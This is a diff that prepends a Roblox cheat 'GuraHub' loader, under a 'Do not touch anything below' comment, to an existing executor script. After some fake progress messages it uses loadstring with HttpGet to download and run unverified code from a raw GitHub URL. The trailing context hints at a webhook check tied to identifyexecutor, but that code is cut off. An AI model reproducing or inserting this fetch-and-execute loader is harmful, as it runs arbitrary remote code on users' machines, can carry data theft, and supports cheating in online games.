@@ -1,3 +1,37 @@
+-- Do not touch anything below
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local rcp = rconsoleprint
+
+
+function IsExecuted()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/momenthubv3/Gura-Hub/patch-1/loader.lua'))()
+end
+
+rconsolename("GuraHub")
+
+local c = "@@CYAN@@"
+local y = "@@YELLOW@@"
+local w = "@@WHITE@@"
+local g = "@@GREEN@@"
+local b = "@@BLUE@@"  
+local r = "@@RED@@"
+
+task.wait(2)
+
+task.spawn(function()
+    rcp(c) rcp('GameList: Chicago Remastered | Project Menacing | World Of stands | Anime Journy|Miami Florida roleplay |Legend Piece \n')
+    wait(2)
+    rcp(w) rcp("Running GuraHub \n")
+    wait(2)
+    rcp(w) rcp("Getting GuraHub  \n")
+    wait(2)
+    rcp(w) rcp("GuraHub Ready \n")
+    wait(3) do
+     spawn(IsExecuted)
+    end
+end)
+
 local AwakenKitten = identifyexecutor()
     local webhookcheck =
        AwakenKitten
